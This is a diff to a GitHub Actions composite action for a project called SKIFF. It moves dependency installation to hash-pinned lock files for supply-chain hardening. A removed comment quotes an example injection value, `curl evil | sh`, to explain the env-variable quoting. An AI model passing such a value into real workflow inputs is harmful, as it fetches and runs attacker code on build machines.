@@ -10,7 +10,12 @@ inputs:
     required: false
     default: "3.12"
   install-extras:
-    description: Pip extras to install (default dev).
+    description: >-
+      Selects the hash-pinned lock file to install. Empty string ->
+      runtime-only requirements.txt (lean boot for a11y/ZAP). Any
+      non-empty value -> requirements-dev.txt, the runtime+dev+e2e
+      superset (covers both `dev` and `dev,e2e` callers). The exact
+      string past "non-empty" no longer maps to pip extras.
     required: false
     default: "dev"
 
@@ -25,18 +30,23 @@ runs:
 
     - name: Install dependencies
       shell: bash
-      # Pass `install-extras` via env instead of direct `${{ }}`
-      # interpolation into the run script. The value becomes a bash
-      # variable `${SKIFF_EXTRAS}` that cannot break out of the
-      # `pip install -e ".[...]"` invocation even if a future caller
-      # passes a hostile value (e.g. `dev]"; curl evil | sh; "`).
-      # Gated today by CODEOWNERS on .github/, but zero-trust says
-      # don't trust the caller even when the caller is yourself.
+      # Supply-chain hardening for OpenSSF Scorecard "Pinned-Dependencies":
+      # install every third-party dep from a hash-pinned lock file with
+      # `--require-hashes` (rejects a tampered PyPI artifact even at the
+      # pinned version), then install SKIFF itself editable with `--no-deps`
+      # so no transitive dependency is ever fetched unverified. Scorecard
+      # treats both of these forms as pinned; a plain `pip install -e .[..]`
+      # is not. Regenerate the locks with `make deps`.
+      #
+      # `install-extras` is only tested for empty/non-empty here, so it is
+      # passed via env and quoted — a hostile caller value cannot reach a
+      # shell or a package spec (CODEOWNERS-gated today; zero-trust anyway).
       env:
         SKIFF_EXTRAS: ${{ inputs.install-extras }}
       run: |
         if [ -n "${SKIFF_EXTRAS}" ]; then
-          pip install -e ".[${SKIFF_EXTRAS}]"
+          pip install --require-hashes -r requirements-dev.txt
         else
-          pip install -e .
+          pip install --require-hashes -r requirements.txt
         fi
+        pip install --no-deps -e .
